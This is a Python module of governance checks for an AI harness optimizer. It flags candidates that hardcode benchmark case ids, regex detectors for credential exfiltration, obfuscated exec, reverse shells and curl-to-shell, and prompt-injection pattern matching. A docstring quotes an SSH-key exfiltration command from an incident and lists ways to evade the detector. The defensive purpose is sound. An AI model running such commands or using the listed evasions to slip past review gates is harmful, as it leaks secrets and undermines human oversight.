"""Deterministic governance helpers for harness optimizer candidates.

Phase 3 only: local checks over candidate text and declared surface changes.
No model, shell, GitHub, MCP, or request-path imports.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from guardrails.rails import build_injection_pattern_sources, compile_injection_patterns
from utils.errors import AgenticError

# Shared with core.RunReport.has_critical_governance_finding: the gate there
# recognizes this exact severity string by convention (parsed back out of
# as_gate_string()'s "severity: code: message" format). Importing the constant
# instead of a bare literal means a rename here is at least a visible import,
# not a silent two-file drift.
CRITICAL_SEVERITY = "critical"


@dataclass(frozen=True)
class GovernanceFinding:
    """A local governance finding emitted before candidate acceptance."""

    severity: str
    code: str
    message: str

    def __post_init__(self) -> None:
        if self.severity not in {"info", "warning", CRITICAL_SEVERITY}:
            raise AgenticError("severity must be info, warning, or critical", details={"severity": self.severity})

    def as_gate_string(self) -> str:
        return f"{self.severity}: {self.code}: {self.message}"


def detect_visible_case_hardcoding(candidate_text: str, visible_case_ids: tuple[str, ...]) -> bool:
    """Return true when a candidate appears to key directly on visible case ids.

    Matches on whole case-id tokens (negative-lookaround anchored on `[\\w-]`) so
    a shorter id like "case-1" does not falsely fire on unrelated ids that merely
    share its prefix, e.g. "case-10" or "case-1b" — nor on unrelated ids that
    happen to contain it as a dash-delimited substring, e.g. "test-case-1" or
    "hard-case-1" (a plain `\\b` boundary treats hyphen as a boundary character
    and would wrongly match those). This feeds the hard rejection gate in
    decide_candidate, so a substring false positive would reject a legitimate
    candidate.
    """

    if not candidate_text or not visible_case_ids:
        return False
    return any(
        re.search(rf"(?<![\w-]){re.escape(case_id.strip())}(?![\w-])", candidate_text, re.IGNORECASE)
        for case_id in visible_case_ids
        if case_id.strip()
    )


def governance_gate_strings(findings: tuple[GovernanceFinding, ...]) -> tuple[str, ...]:
    """Serialize findings into the existing RunReport governance string format."""

    return tuple(finding.as_gate_string() for finding in findings)


# Code-shape rules for PROPOSED FILE CONTENT. Deliberately separate from the
# injection-pattern union above: that set is tuned for PROSE (a chat turn, a PR
# body, a check's stdout) and asks "is this trying to talk to a model", which is
# a different question from "is this code trying to exfiltrate a key". Adding
# these to banned_patterns would false-positive across the RAG corpus and the
# sanitizer, whose pattern list is contractual (see CLAUDE.md section 4).
#
# Every rule is a COMBINATION, never a single token. `subprocess` alone is
# ordinary (this repo calls it in gh_client, ops_runner and executor/runner);
# `subprocess` plus a hardcoded private-key path is not. Single-token rules on
# any of these would fire on legitimate changes constantly and train an
# operator to wave the gate through, which is worse than no gate.
_SECRET_PATH_RE = re.compile(
    r"\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.aws/credentials|\.netrc|"
    r"\.git-credentials|\.env\b|credentials\.json|\.kube/config",
    re.IGNORECASE,
)
_EGRESS_RE = re.compile(
    r"\bsubprocess\b|\bos\.system\b|\bos\.popen\b|\bsocket\b|\brequests\.|"
    r"\burllib\b|\bhttpx\b|\bcurl\b|\bwget\b|\bftplib\b|\bsmtplib\b",
    re.IGNORECASE,
)
_DECODE_RE = re.compile(
    r"b64decode|b32decode|a85decode|bytes\.fromhex|codecs\.decode|zlib\.decompress|"
    r"gzip\.decompress|marshal\.loads|pickle\.loads",
    re.IGNORECASE,
)
_DYNAMIC_EXEC_RE = re.compile(r"\bexec\s*\(|\beval\s*\(|\bcompile\s*\(|__import__\s*\(", re.IGNORECASE)
_FD_DUP_RE = re.compile(r"\bdup2\b|\bpty\.spawn\b", re.IGNORECASE)
_SHELL_PATH_RE = re.compile(r"/bin/sh|/bin/bash|/bin/zsh|\bcmd\.exe\b|\bpowershell\b", re.IGNORECASE)
_SOCKET_RE = re.compile(r"\bsocket\b", re.IGNORECASE)
# `curl ... | sh` and friends. The pipe and the shell must both be present;
# `curl` alone is a normal thing for a script to document or invoke.
_PIPE_TO_SHELL_RE = re.compile(r"(curl|wget)[^\n|]{0,200}\|\s*(sudo\s+)?(ba|z|d)?sh\b", re.IGNORECASE)

_CODE_SHAPE_RULES: tuple[tuple[str, str], ...] = (
    ("candidate_credential_egress",
     "reads a credential/private-key path AND carries an egress or exec mechanism"),
    ("candidate_obfuscated_exec",
     "decodes an encoded blob AND passes it to a dynamic exec/eval"),
    ("candidate_reverse_shell",
     "opens a socket AND duplicates file descriptors or spawns a shell"),
    ("candidate_pipe_to_shell",
     "pipes a network download directly into a shell"),
)


def inspect_code_shape(candidate_text: str, enabled: bool = True) -> tuple[GovernanceFinding, ...]:
    """Flag malicious-CODE shapes in content a planner proposes writing to a repo.

    Companion to :func:`inspect_candidate_text`, which only ever asked whether
    content looks like a prompt-injection attempt. That left a real hole,
    demonstrated end-to-end against the live loop on 2026-08-02: a file
    containing ``subprocess.run(['curl', '-d', '@~/.ssh/id_rsa', <attacker
    url>])`` produced ZERO findings, was written to the clone, passed the
    operator's own verification check, and reached ``pending_decision`` --
    one human approval away from being committed.

    WHAT THIS IS NOT. A heuristic denylist over source text. It raises the cost
    of the naive and the accidental case -- a model that reproduces a bad
    pattern from training data, or one that takes an injected instruction
    literally. It does NOT stop a model that is actively trying to evade it,
    and pretending otherwise would be worse than not having it: string
    concatenation (``"sub" + "process"``), ``getattr(__import__("os"),
    "system")``, an unlisted egress channel (DNS, ICMP), or splitting a payload
    across two files all defeat it trivially. Each file is scanned on its own,
    so the cross-file split is explicitly out of scope.

    The real control remains what it already was: a human reading the diff at
    the ``pending_decision`` gate. This exists so that review starts from
    "something here is shaped like an exfiltration" rather than from a blank
    page -- and so the obvious cases never reach a human at all.

    Findings are ``critical`` because ``real_repo_loop`` only gates on that
    severity; a ``warning`` here would be decorative, and a decorative security
    finding is a liability. *enabled* is the operator's escape hatch: a
    heuristic gate that hard-blocks with no recourse is a broken gate, and some
    legitimate changes genuinely do combine these ingredients.
    """
    if not enabled or not isinstance(candidate_text, str) or not candidate_text:
        return ()

    hits = (
        bool(_SECRET_PATH_RE.search(candidate_text)) and bool(_EGRESS_RE.search(candidate_text)),
        bool(_DECODE_RE.search(candidate_text)) and bool(_DYNAMIC_EXEC_RE.search(candidate_text)),
        bool(_SOCKET_RE.search(candidate_text)) and (
            bool(_FD_DUP_RE.search(candidate_text)) or bool(_SHELL_PATH_RE.search(candidate_text))
        ),
        bool(_PIPE_TO_SHELL_RE.search(candidate_text)),
    )
    return tuple(
        GovernanceFinding(CRITICAL_SEVERITY, code, f"proposed file content {message}")
        for hit, (code, message) in zip(hits, _CODE_SHAPE_RULES, strict=True)
        if hit
    )


def inspect_candidate_text(candidate_text: str, cfg: dict | None = None) -> tuple[GovernanceFinding, ...]:
    """Flag prompt-injection-shaped candidate content before acceptance or apply."""

    # Pattern union + compile are shared with agentic.registry and
    # agentic.fsconnect.client via guardrails.rails; the non-string guard this
    # module carried is now part of that shared builder, so all three sites get
    # it. The finding severity below stays local -- guardrails owns the pattern
    # set, this module owns what a match means for a candidate artifact.
    sources = build_injection_pattern_sources(cfg or {})
    for _src, compiled in compile_injection_patterns(tuple(sources)):
        if compiled.search(candidate_text):
            return (
                GovernanceFinding(
                    "critical",
                    "candidate_injection_pattern",
                    "candidate content matches a governed injection pattern",
                ),
            )
    return ()
